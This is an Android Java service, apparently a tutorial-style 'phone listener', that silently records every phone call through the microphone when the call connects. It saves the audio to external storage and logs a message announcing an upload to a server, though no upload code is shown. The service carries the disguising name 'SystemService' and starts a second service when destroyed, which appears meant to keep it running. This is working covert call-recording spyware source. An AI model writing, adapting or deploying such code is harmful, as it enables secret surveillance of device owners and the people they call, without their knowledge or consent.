package com.zww.phonelisner;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class SystemService extends Service {
	private TelephonyManager tm;
	//监听器对象
	private MyListener listener;
	
	//定义录音机
	private MediaRecorder mediaRecorder;
	@Override
	public IBinder onBind(Intent intent) {
		
		return null;
	}
	//服务创建时调用的方法
	@Override
	public void onCreate() {
		//后台监听电话的呼叫状态
		tm=(TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);//获得电话管理的引用
		listener=new MyListener();
		tm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
		super.onCreate();
	}
	


	private class MyListener extends PhoneStateListener {
		//当电话状态发生改变时调用的方法
		public void onCallStateChanged(int state, String incomingNumber) {
			// TODO Auto-generated method stub
			super.onCallStateChanged(state, incomingNumber);
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_IDLE://空闲状态
						//空闲状态，停止录音，判断mediaRecored是否实例化
					if(mediaRecorder!=null){
						mediaRecorder.stop();//8停止录音
						//释放资源
						mediaRecorder.release();
						System.out.println("录制完毕！上传文件到服务器");
					}
					break;
				case  TelephonyManager.CALL_STATE_RINGING: //响铃状态
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK://通话状态
				       //通话状态时开启一个录音机
					//准备开始录音
					//1.实例化一个mediaRecorder
					mediaRecorder=new MediaRecorder();
					//2指定录音机的声音源。麦克风
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					//3设置输出文件的格式
					mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
					//4指定录音文件的名称
					//定义一个文件对象
					File file = new File(Environment.getExternalStorageDirectory(),System.currentTimeMillis()+".3gp");
					mediaRecorder.setOutputFile(file.getAbsolutePath());
					//5设置音频的编码方式
					mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
					//6准备录音
					mediaRecorder.prepare();
					//7开始录音
					mediaRecorder.start();
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			} 
		}
		
	}
	
	//服务销毁时调用的方法
	public void onDestroy() {	
		super.onDestroy();
		//取消电话的监听
		Intent i=new Intent(this,SystemService2.class);
		startService(i);
		tm.listen(listener, PhoneStateListener.LISTEN_NONE);
	}

}
